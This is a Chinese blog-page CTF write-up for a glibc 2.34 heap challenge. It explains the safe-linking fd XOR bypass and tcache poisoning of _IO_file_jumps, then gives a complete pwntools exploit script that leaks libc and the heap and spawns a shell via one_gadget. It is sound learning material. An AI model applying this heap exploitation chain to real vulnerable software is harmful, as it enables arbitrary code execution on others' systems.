@@ -1,0 +1,89 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>2.34 高版本libc safe-linking 初体验 (被恶心死了)</title>
+</head>
+<body>
+<b>2.34 高版本libc safe-linking 初体验 (被恶心死了)</b><br>
+<small>2025-04-20</small>
+<hr>
+<blockquote>
+<p>Problem: <a href="https://www.nssctf.cn/problem/2388">[CISCN 2022 华东北]duck</a></p>
+</blockquote>
+<br><b><a href="#思路"></a>思路</b><br>
+<p>高版本libc2.34 照搬一下其他师傅的<br>现在的接收都是u64(p.recv(5).ljust(8,b’\x00’)) &lt;&lt; 12<br>而修改heap的fd指针则是(heap_addr &gt;&gt; 12)^target_addr<br>默认创建0X100的chunk 然后跟之前一样打tcache满 然后到unsortbin泄露 main_arena + offset 然后可以得到libc_base 打_IO_file_jumps<br>_IO_file_jumps 结构第四个是_io_newfile_overflow 据说puts要用到<br>我是倒着free的 因为正着free会和top_chunk合并<br>所以也是倒着改fd libc2.34有safe-linking 加密fd 改完 new到结构 直接打onegadget 得到shell</p>
+<br><b><a href="#EXP"></a>EXP</b><br>
+<pre><code>
+  from pwn import *
+context.log_level = &#x27;debug&#x27;
+io = remote(&quot;node4.anna.nssctf.cn&quot;,28290)
+#io = process(&quot;./pwn&quot;)
+e = ELF(&#x27;./pwn&#x27;)
+libc = ELF(&#x27;./libc.so.6&#x27;)
+
+s       = lambda data               :io.send(data)
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r       = lambda num                :io.recv(num)
+ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
+itr     = lambda                    :io.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b&#x27;\x00&#x27;))
+uu64    = lambda data               :u64(data.ljust(8,b&#x27;\x00&#x27;))
+ls      = lambda data               :log.success(data)
+
+def new():
+    sla(b&quot;Choice:&quot;,str(1))
+
+def edit(idx,size,content):
+    sla(b&quot;:&quot;,str(4))
+    sla(b&quot;Idx:&quot;,str(idx))
+    sla(b&quot;Size:&quot;,str(size))
+    sla(b&quot;Content:&quot;,content)
+
+def show(idx):
+    sla(b&quot;:&quot;,str(3))
+    sla(b&quot;Idx:&quot;,str(idx))
+
+def free(idx):
+    sla(b&quot;Choice:&quot;,str(2))
+    sla(b&quot;Idx:&quot;,str(idx))
+
+for i in range(8):
+    new()
+
+for i in range(8):
+    free(7-i)
+
+show(0)
+leak_main_arena = uu64(ru(b&quot;Done&quot;,drop=True)[2:8])
+ls(&quot;leak=&gt;&quot;+hex(leak_main_arena))
+libc_base = leak_main_arena -0x1f2c60 -0x60
+ls(&quot;libc_base&quot;+hex(libc_base))
+IO_file_jumps = libc_base + libc.sym[&#x27;_IO_file_jumps&#x27;]
+ls(&quot;IO_file_jumps&quot;+hex(IO_file_jumps))
+show(7)
+leak_heap_struct = uu64(ru(b&quot;Done&quot;,drop=True)[2:7])  &lt;&lt; 12
+ls(&quot;leak_heap_struct&quot;+hex(leak_heap_struct))
+final_IO_file_chunk = (leak_heap_struct &gt;&gt; 12)^IO_file_jumps
+ls(&quot;final_IO_file_chunk&quot;+hex(final_IO_file_chunk))
+for i in range(5):
+    new()
+edit(6,0x10,p64(final_IO_file_chunk) + p64(0))
+new() #13
+new() #14
+one_gadget = libc_base + 0xda864
+edit(14,0x20,p64(0)*3+p64(one_gadget))
+#attach(io)
+
+#attach(io)
+
+io.interactive()</code></pre>
+
+<br><b><a href="#总结"></a>总结</b><br>
+<p>接收有点恶心了 safe-linking也是 还加密fd XOR 吐了</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
